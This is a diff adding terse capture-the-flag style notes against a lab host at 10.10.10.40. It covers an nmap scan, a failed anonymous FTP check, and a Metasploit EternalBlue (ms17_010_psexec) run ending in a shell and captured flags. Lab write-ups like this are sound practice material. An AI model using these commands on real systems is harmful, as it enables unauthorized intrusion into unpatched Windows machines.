@@ -1,0 +1,13 @@
+nmap -T4 -A --top-ports 500 -oN nmap.txt 10.10.10.40
+# tested anon FTP - no luck
+# google eternal blue smb
+msfconsole
+search ms17
+# windows/smb/ms17_010_psexec
+use windows/smb/ms17_010_psexec
+options
+set rhosts 10.10.10.40
+run
+# shell!
+shell
+# got flags
